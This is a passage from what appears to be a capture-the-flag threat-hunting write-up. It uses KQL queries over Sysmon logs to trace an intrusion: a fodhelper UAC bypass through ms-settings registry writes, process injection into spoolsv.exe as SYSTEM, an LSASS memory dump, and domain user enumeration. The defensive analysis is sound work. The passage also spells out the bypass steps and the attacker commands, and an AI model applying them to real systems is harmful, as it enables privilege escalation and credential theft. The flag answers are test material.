**Goal:** Identify the Windows binary used to bypass UAC and execute the payload with elevated privileges.

**Approach:** The registry modification to the ms-settings key (TargetObject_s) pointed to a UAC bypass via a trusted auto-elevating binary. Searched EventID 13 (registry value set) for the hijacked key first to confirm the technique, then tried to find the binary execution.

```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10)
| where TimeGenerated <= datetime(2026-02-11)
| where EventID_s == 13
| where TargetObject_s has "ms-settings" or TargetObject_s has "mscfile"
| project TimeGenerated, Computer, Image_s, TargetObject_s, Details_s
| order by TimeGenerated asc
```

Confirmed the ms-settings\shell\open\command registry key was set to `C:\Users\Public\update.exe`. The binary that reads this key and auto-elevates is fodhelper.exe. Tried to confirm the execution directly with EventID 1 and Image_s filter — no hits. Widened the window and searched CommandLine_s for fodhelper — also no hits.

Pivoted to Raw_s as a last resort:

```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10)
| where TimeGenerated <= datetime(2026-02-11)
| where Raw_s has "fodhelper"
| project TimeGenerated, Computer, Raw_s
| order by TimeGenerated asc
```

<img width="1521" height="263" alt="image" src="https://github.com/user-attachments/assets/1a6c28fe-ad9c-40ea-b323-e0fd50b838e8" />
<br>

The Raw_s results showed the full chain: `rundll32.exe` spawning `cmd.exe /c fodhelper.exe`, confirming execution. fodhelper read the hijacked registry key and launched update.exe with elevated privileges — no UAC prompt shown to the user.

**Flag:** `fodhelper.exe`

> **Lesson:** When Image_s and CommandLine_s filters return nothing for a known process, fall back to Raw_s. The raw Sysmon XML contains every field, including ones that don't parse into named columns. fodhelper.exe is one of the most well-known UAC bypass binaries — it's a legitimate Windows 10+ feature accessibility helper that auto-elevates without prompting. The attack pattern is: write malicious path into ms-settings registry key, then invoke fodhelper. Windows does the elevation for you.

</details>

<details>
<summary>Q20 — Registry Bypass Enabler</summary>

**Goal:** Identify the specific registry value that enabled the UAC bypass redirect.

**Approach:** From Q19, the ms-settings registry key was hijacked. But the hijack requires two registry modifications — one sets the payload path, the other enables the redirect. Narrowed the time window to just before the fodhelper execution and pulled both EventID 13 entries.

```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10T22:43:00)
| where TimeGenerated <= datetime(2026-02-10T22:43:15)
| where EventID_s == 13
| where TargetObject_s has "ms-settings"
| project TimeGenerated, TargetObject_s, Details_s
| order by TimeGenerated asc
```

Two rows returned:

1. `(Default)` set to `C:\Users\Public\update.exe` — the payload path
2. `DelegateExecute` set to empty — the redirect enabler

<img width="594" height="157" alt="image" src="https://github.com/user-attachments/assets/422c7786-65ac-47f8-9b73-a09ffa438fef" />
<br>

Setting DelegateExecute to an empty value tells Windows to use the (Default) command instead of the normal COM delegate handler. Without this second write, the hijack doesn't work.

**Flag:** `DelegateExecute`

> **Lesson:** The fodhelper UAC bypass requires exactly two registry writes to the ms-settings\shell\open\command key. Writing the payload path alone isn't enough — the DelegateExecute value must also be present (even empty) to trigger the redirect behavior. When hunting this technique, look for both values written in close succession. Alerting on either write to ms-settings\shell\open\command is a high-fidelity detection with very low false-positive rate.

</details>

<details>
<summary>Q21 — Stable Injection Chain</summary>

**Goal:** Identify the second process injection performed after the UAC bypass, including the target process and its security context.

**Approach:** From Q18, the first injection was `rundll32.exe > notepad.exe` running under `EMBERFORGE\lmartin`. After the UAC bypass, update.exe ran elevated and should have performed a second injection into a SYSTEM-level process. Searched EventID 8 with filters to exclude the first injection.

Initial attempts with SourceImage_s filters for update.exe returned nothing — the parsed field wasn't populating correctly. Tried excluding dwm.exe and rundll32 to isolate other injection pairs, but only the first injection came back. Pivoted to Raw_s to bypass the field-parsing issue:

```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10)
| where TimeGenerated <= datetime(2026-02-11)
| where Raw_s has "update.exe" and EventID_s == 8
| project TimeGenerated, Computer, Raw_s
```

The raw XML revealed the full injection event:

- **SourceImage:** `C:\Users\Public\update.exe`
- **TargetImage:** `C:\Windows\System32\spoolsv.exe`
- **TargetUser:** `NT AUTHORITY\SYSTEM`

The elevated update.exe injected into the Print Spooler service, inheriting SYSTEM-level privileges.

**Flag:** `update.exe > spoolsv.exe (NT AUTHORITY\SYSTEM)`

> **Lesson:** When EventID 8 field parsing fails, Raw_s is the fallback. The injection chain tells the full privilege story: lmartin (standard user) → UAC bypass → update.exe (elevated admin) → spoolsv.exe (SYSTEM). Each step up the chain expands what the attacker can do. Spoolsv.exe is a common injection target because it runs as SYSTEM, is always present, and generates legitimate network traffic — making it a natural host for a privileged beacon.

</details>

<details>
<summary>Q22 — Credential Dumping Process</summary>

**Goal:** Identify the process that dumped LSASS memory.

**Approach:** No additional query needed. The Q21 Raw_s search already surfaced the answer. While looking for the second injection chain, the EventID 11 (FileCreate) query confirmed that update.exe created the LSASS dump file directly.

From the Q21 follow-up query:

```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10)
| where TimeGenerated <= datetime(2026-02-11)
| where EventID_s == 11
| where TargetFilename_s has_any ("lsass", ".dmp", "dump")
| project TimeGenerated, Computer, Image_s, TargetFilename_s
| order by TimeGenerated asc
```

Image_s returned `C:\Users\Public\update.exe` as the process that created the dump. Direct syscalls were used to avoid API-level monitoring — no EventID 10 (ProcessAccess) was generated, only the file creation event.

**Flag:** `update.exe`

> **Lesson:** Traditional LSASS dumping via MiniDumpWriteAll triggers EventID 10 (ProcessAccess) with access rights 0x1FFFFF. Direct syscall implementations bypass this entirely — the only telemetry left is the dump file hitting disk as EventID 11. When hunting credential dumping, always check FileCreate for .dmp files in addition to ProcessAccess events. The absence of EventID 10 is itself a signal that a more sophisticated technique was used.

</details>

<details>
<summary>Q23 — Dump Location</summary>

**Goal:** Identify the full path where the LSASS dump file was written.

**Approach:** No additional query needed. The TargetFilename_s field from the Q22 FileCreate query returned the full path directly.

From the Q22 results:

```
C:\Windows\System32\lsass.dmp
```

Staging the dump in System32 is a deliberate choice — it blends in with legitimate Windows files in a directory that contains hundreds of system binaries and DLLs. A cursory directory listing wouldn't stand out.

**Flag:** `C:\Windows\System32\lsass.dmp`

> **Lesson:** Attackers don't always stage dumps in obvious locations like C:\Users\Public\ or C:\Windows\Temp\. Dropping lsass.dmp inside System32 is a camouflage technique — the directory is noisy with legitimate files. When hunting for credential dumps, search by filename and extension (.dmp, lsass) across all paths, not just the obvious staging directories.

</details>

## 🔍 Phase 6: What did they enumerate?

<details>
<summary>Q24 — User Enumeration</summary>

**Goal:** Identify the command used to enumerate domain user accounts.

**Approach:** After gaining SYSTEM-level access, the attacker needed to understand the domain structure. Searched for net commands targeting domain user accounts.

```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10)
| where TimeGenerated <= datetime(2026-02-11)
| where CommandLine_s has "net" and CommandLine_s has "user" and CommandLine_s has "domain"
| project TimeGenerated, Computer, CommandLine_s
| order by TimeGenerated asc
```

<img width="1198" height="256" alt="image" src="https://github.com/user-attachments/assets/802f7a67-1f36-4d29-967b-138721352c77" />
<br>

On the workstation at 10:43:17 PM, `net user /domain` executed — querying the full list of domain user accounts from the Domain Controller.

**Flag:** `net user /domain`

> **Lesson:** net user /domain is one of the most reliable early-stage discovery signals. It's a single command that dumps every account in the domain — names, groups, and account states. In a threat hunt, discovery commands like this clustered in a short time window are a strong indicator of post-exploitation enumeration. The attacker is building a target list for credential reuse and lateral movement.

</details>

